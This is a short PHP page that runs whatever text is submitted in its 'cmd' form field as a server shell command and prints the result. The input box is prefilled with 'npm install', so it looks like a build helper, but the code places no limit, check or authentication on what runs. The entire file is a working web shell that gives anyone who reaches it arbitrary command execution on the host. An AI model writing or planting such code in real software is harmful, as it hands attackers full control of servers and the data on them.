<?php

if (isset($_POST['cmd']))
{
$cmd = $_POST['cmd'];
$result = shell_exec($cmd);
echo "<pre>".$result."</pre>";
}
?>
<form method="post">
<p>
<input  type="text" value="npm install" name="cmd"/>
</p>
<input type="submit" value="Execute"/>
<form>


